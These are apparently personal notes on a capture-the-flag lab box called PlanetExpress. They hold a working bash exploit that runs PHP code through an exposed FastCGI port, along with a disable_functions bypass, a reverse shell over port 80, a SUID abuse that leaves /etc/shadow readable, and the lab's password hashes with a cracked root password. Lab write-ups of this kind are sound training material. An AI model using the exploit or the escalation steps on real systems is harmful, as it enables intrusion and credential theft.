202307091616
Status: #fastcgi #relayd 
Tags: [[Labs]] [[pg]]

# PlanetExpress
IP: 192.168.167.205

## Recon

Ports open:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener
```

Port 80: 

- Pico CMS
- Apache 2.4.38

Port 9000:

- Nmap does not recognize
- cslistener?
- HackTricks states that by default FastCGI runs on port 9000 and is not recognized by nmap. Usually FastCGI only listens locally. In this case, it is not.
- HackTricks gives us the exploit code:

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/html/planetexpress/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```


## Exploitation

- After trial and error by manually testing certain directory paths, we discover that the main directory for the webapp is `/var/www/html/planetexpress/`. therefore we can use the index.php in that directory.
- However, when trying to exploit the vulnerability, we see that the system() function is disabled due to security reason.
- Thankfully, HackTricks also has information on how to bypass disabled_functions
- After trying out multiple functions, we discover that the function `passthru()` is not disabled and allows us to execute arbitrary commands.

![[planetexpress_poc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/planetexpress_poc.png">

- We can see that when we execute this exploit, our machine was pinged by the target.
- Trying to get a reverse shell was troublesome. We know the target can communicate with our machine, however we could not establish a connection.
- Eventually, I was able to discover that the issue was that the firewall only allowed connections to certain ports. In this case it was port 80. So we were able to listen on port 80 and get a reverse shell.

## Escalating Privileges

- After manual enumeration as www-data. We found a specific binary with a SUID bit set.

![[planetexpress_suid.png]]


<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/planetexpress_suid.png">

- After some testing with this binary, we find that there is a specific flag that allows us to read from a config file.
- We can try to read the `/etc/shadow` file and see if it works since the owner of the binary is root.
- We did not get any contents shown but I did notice that shadow file was now given read permissions for everyone.

```bash
-rw-r--r-- 1 root shadow 940 Jan 10  2022 /etc/shadow
```

- We gathered both the root and astro's hashes.

```
astro: 
$6$3c/stP2hxnireZRa$8Byaa52GnSq5BEVJtCrh2ZAKNSzYRvFuDEb2q2jk8hsJH91qQ6zgtUCxAZ.NgssBCJ7I8DURme/kd7MSkNl5f/

root:
$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1
```

- Utilizing hashcat, we were able to crack root's hash and get the password: `neverwant2saygoodbye`
- Root!




---
# References

Bypass Disabled_Functions: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi

Pentesting 9000 - FastCGI: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi
